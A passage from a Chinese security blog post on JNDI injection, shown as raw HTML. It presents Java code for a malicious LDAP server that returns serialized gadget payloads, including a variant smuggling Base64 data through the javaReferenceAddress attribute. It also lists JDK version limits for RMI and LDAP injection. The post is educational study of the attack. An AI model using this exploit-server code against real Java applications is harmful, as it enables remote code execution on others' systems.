class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line"></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, <span class="keyword">new</span> <span class="title class_">Java</span>().marshal(getPayload()));</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>触发点2：</strong>第一种改造</p>
<p>关注<code>com.sun.jndi.ldap.Obj.java#decodeReference()</code>方法，其在重构<code>Reference</code>对象的基础之上，如果存在javaReferenceAddress属性还会继续构建该属性，满足特定条件可以也触发<code>deserializeObject()</code>方法</p>
<p><img src="/2023/01/11/JNDI/image-20230111112155439.png" alt="image-20230111112155439"></p>
<p>源码细节见：<a target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/com/sun/jndi/ldap/Obj.java">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/com/sun/jndi/ldap/Obj.java</a></p>
<p>需要满足的条件如下：</p>
<ol>
<li>第一个符号为分隔符</li>
<li>第一个分隔符和第二个分隔符之间，表示<code>Reference</code>的<code>position</code>，需要是整数类型</li>
<li>第二个分隔符到第三个分隔符之间，表示<code>type</code></li>
<li>第三个分隔符为双分隔符，用于表示为内容，之后的内容为序列化数据</li>
<li>序列化数据需要Base64编码</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line"></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaReferenceAddress&quot;</span>, <span class="string">&quot;$1$String$$&quot;</span>+<span class="keyword">new</span> <span class="title class_">Base64Encoder</span>().encode(<span class="keyword">new</span> <span class="title class_">Java</span>().marshal(getPayload())));</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>JNDI-RMI</code>注入方式有：</p>
<ul>
<li><code>codebase</code>(<code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code>之前可以) </li>
<li>利用本地<code>Class Factory</code>作为<code>Reference Factory</code></li>
</ul>
<p><code>JNDI-LDAP</code>注入方式： </p>
<ul>
<li><code>codebase</code>(<code>JDK 11.0.1</code>、<code>8u191</code>、<code>7u201</code>、<code>6u211</code>之前可以) </li>
<li><code>serialize</code>（两个切入点）</li>
</ul>
</blockquote>
<h4 id="工具化利用"><a href="#工具化利用" class="headerlink" title="工具化利用"></a>工具化利用</h4><p>这里参考su18师傅和 welk1n 师傅的工具造个轮子，锻炼一下自己的工程化开发能力</p>
<p>之后新开一帖</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/su18/JNDI">https://github.com/su18/JNDI</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit/">https://github.com/welk1n/JNDI-Injection-Exploit/</a></li>
<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1611/">https://tttang.com/archive/1611/</a></li>
</ul>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFJNDI"><span class="toc-number">2.</span> <span class="toc-text">什么是JNDI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E5%90%8D-gt-Naming-Service"><span class="toc-number">3.</span> <span class="toc-text">命名 &#x3D;&gt; Naming Service</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95-gt-Directory-Service"><span class="toc-number">4.</span> <span class="toc-text">目录 &#x3D;&gt; Directory Service</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E9%9C%80%E8%A6%81%E7%9A%84%E7%B1%BB"><span class="toc-number">5.</span> <span class="toc-text">一些需要的类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI-Reference-%E6%B3%A8%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text">JNDI Reference 注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI-RMI"><span class="toc-number">7.</span> <span class="toc-text">JNDI-RMI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI-LDAP"><span class="toc-number">8.</span> <span class="toc-text">JNDI_LDAP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-number">9.</span> <span class="toc-text">工具化利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">10.</span> <span class="toc-text">参考链接</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://racerz-fighting.github.io/2023/01/11/JNDI/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://racerz-fighting.github.io/2023/01/11/JNDI/&text=JNDI注入浅析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://racerz-fighting.github.io/2023/01/11/JNDI/&title=JNDI注入浅析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://racerz-fighting.github.io/2023/01/11/JNDI/&is_video=false&description=JNDI注入浅析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=JNDI注入浅析&body=Check out this article: https://racerz-fighting.github.io/2023/01/11/JNDI/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://racerz-fighting.github.io/2023/01/11/JNDI/&title=JNDI注入浅析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://racerz-fighting.github.io/2023/01/11/JNDI/&title=JNDI注入浅析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://racerz-fighting.github.io/2023/01/11/JNDI/&title=JNDI注入浅析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://racerz-fighting.github.io/2023/01/11/JNDI/&title=JNDI注入浅析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://racerz-fighting.github.io/2023/01/11/JNDI/&name=JNDI注入浅析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://racerz-fighting.github.io/2023/01/11/JNDI/&t=JNDI注入浅析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2023
    RacerZ
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
